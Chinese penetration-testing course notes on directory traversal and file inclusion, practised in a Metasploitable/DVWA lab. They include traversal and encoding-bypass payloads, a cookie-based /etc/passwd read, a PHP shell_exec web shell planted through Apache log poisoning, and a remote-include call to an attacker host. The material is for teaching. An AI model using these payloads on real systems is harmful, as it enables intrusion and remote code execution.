@@ -1,0 +1,177 @@
+课时86 手动漏洞挖掘（三）
+
+手动漏洞挖掘
+Directory travarsal / File include(有区别/没区别)
+    目录权限限制不严 / 文件包含
+/etc/php5/cgi/php.ini
+    allow_url_include = on
+应用程序功能操作文件，限制不严时导致访问WEB目录以外的文件
+    读、写文件、远程执行代码
+特征但不绝对
+    ?page=a.php
+    ?home=b.html
+    ?file=content
+
+msfadmin@metasploitbale:~$ ifconfig
+
+msfadmin@metasploitbale:~$ sudo vi /etc/php5/cgi/php.ini
+allow_url_include = ON
+
+msfadmin@metasploitbale:~$ sudo /etc/init.d/apache2 restart
+
+手动漏洞挖掘
+经典测试方法
+    ?file=../../../../etc/passwd
+    ?page=file:///etc/passwd
+    ?home=main.cgi
+    ?page=http://www.a.com/1.php
+    http://1.1.1.1/../../../../dir/file.txt
+编码绕过字符过滤
+    "."    "%00"       #绕过文件扩展名过滤
+        file=a.doc%00.php
+    使用多种编码尝试
+
+root@kali:~# pwd
+
+root@kali:~# cd .                       //当前目录
+
+root@kali:~# cd ../../                  //根目录
+ 
+root@kali:~# cd ../../../../            //跳到根目录
+
+手动漏洞挖掘
+不同操作系统的路径特征字符
+    类unix系统
+        根目录: /
+        目录层级分隔符: /
+    Windows系统
+        C:\
+        \ 或 /
+
+手动漏洞挖掘
+    url编码、双层url编码
+        %2e%2e%2f        解码: ../
+        %2e%2e%5c        解码: ..\
+        %252e%252e%255c  解码: ..\
+    Unicode/UTF-8编码
+        ..%c0%af         解码: ../
+        ..%u2216
+        ..%c1%9c         解码: ..\
+
+手动漏洞挖掘
+其他系统路径可能使用到的字符
+    file.txt....
+    file.txt<spaces>
+    file.txt""""
+    file.txt<<<>>><
+    ./././file.txt
+    nonexistant/../file.txt
+UNC路径
+    \\1.1.1.1\path\to\file.txt
+
+root@kali:~# cd a
+
+root@kali:~# cd a/../a.txt
+
+手工漏洞挖掘
+代码 <?php
+     $template = 'blue.php'
+     if ( is_set( $_COOKIE['TEMPLATE'] ) )
+         $template = $_COOKIE['TEMPLATE'];
+     include ( "/home/users/phpguru/templates/" . $template );
+     ?>
+
+攻击 GET /vulnerable.php HTTP/1.0\
+     Cookie: TEMPLATE=../../../../../../../../../etc/passwd
+
+结果 HTTP/1.0 200 OK
+     Content-Type: text/html
+     Server:Apache
+
+     root:fi3sED95ibqR6:0:1:System Operator:/:/bin/ksh
+     daemon:*:1:1::/tmp:
+     phpguru:f8fk3j1OIf31.:182:100:Developer:/home/users/phpguru/:/bin/csh
+
+手动漏洞挖掘
+本地文件包含lfi
+    查看文件
+    代码执行
+        <?php echo shell_exec($_GET['cmd']);?>
+        Apache access.log
+远程文件包含rfi
+    出现概率少于lfi，但更容易被利用
+
+msfadmin@metasploitbale:~$ cd /var/log/apache2/
+
+msfadmin@metasploitbale:~/var/log/apache2$ cat access.log
+
+root@kali:~# nc 192.168.1.118 80
+<?php echo shell_exec($_GET['cmd']);?>
+
+HTTP/1.1 400 Bad Request
+Date: Mon, 18 jan 2016 12:19:29 GMT
+Server: Apache/2.2.8 (Ubuntu) DAV/2
+Content-Length: 323
+Contetion: close
+Content-Type: text/html; charset=iso-8859-1
+
+<!DOCTYPE HTML_ PUBLIC "-//IEIF//DTD HTML 2.0//EN">
+<html><head>
+<title>400 Bad Request</title>
+</head><body>
+<h1>Bad Request</hl>
+<p>Your browser sent a request that this server could not understand.<br />
+</p>
+<hr>
+<address>Apache/2.2.8 (Ubuntu) DAV/2 Server at metasploitable.localdomain Port 80</address>
+</body></html>
+
+msfadmin@metasploitbale:~/var/log/apache2$  ls -l access.log
+
+msfadmin@metasploitbale:~/var/log/apache2$ cd ..
+
+msfadmin@metasploitbale:~/var/log$ sudo chmod a+xr apache2/
+
+msfadmin@metasploitbale:~/var/log$ ls -ld apache2/
+
+msfadmin@metasploitbale:~/var/log$ cd ..
+
+msfadmin@metasploitbale:~/var$ ls -ld log
+
+msfadmin@metasploitbale:~/var$ cd ..
+
+msfadmin@metasploitbale:~$ ls -ld var/
+
+msfadmin@metasploitbale:~$ cd /var/log/apache2/
+
+msfadmin@metasploitbale:~/var/log/apache2$ cat access.log
+
+192.168.1.168/dvwa/vulnerablities/fi/?page=http://192.168.1.119/a.php
+root@kali:~# nc -nclp 80
+listening on [any] 80 ...
+connect to [192.168.1.119 from (UNKNOWN) [192.168.1.118] 52612
+GET /a.php HTTP/1.0
+Host: 192.168.1.119
+
+--------------------------------------------------------------------
+<?php
+
+    $file = $_GET['page']; //The page we wish to display
+
+?>
+
+----------------------------------------------------------------------
+?php
+
+    $file = $_GET['page']; //The page we wish to display
+
+    // Only allow include.php
+    if ( $file != "include.php" ) {
+        echo "ERROR: File not found!";
+        exit;
+     }
+?>
+
+
+
+?>
